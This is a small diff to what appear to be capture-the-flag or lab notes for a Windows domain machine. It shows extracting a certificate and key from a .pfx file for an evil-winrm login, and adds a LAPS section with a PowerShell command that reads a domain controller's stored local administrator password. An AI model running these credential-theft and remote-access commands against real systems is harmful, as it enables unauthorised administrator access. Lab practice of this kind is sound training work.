@@ -58,7 +58,11 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.c
 evil-winrm -i $IP -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
 ```
 
+## LAPS
+
+```pwsh
 Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+```
 
 ### references
 
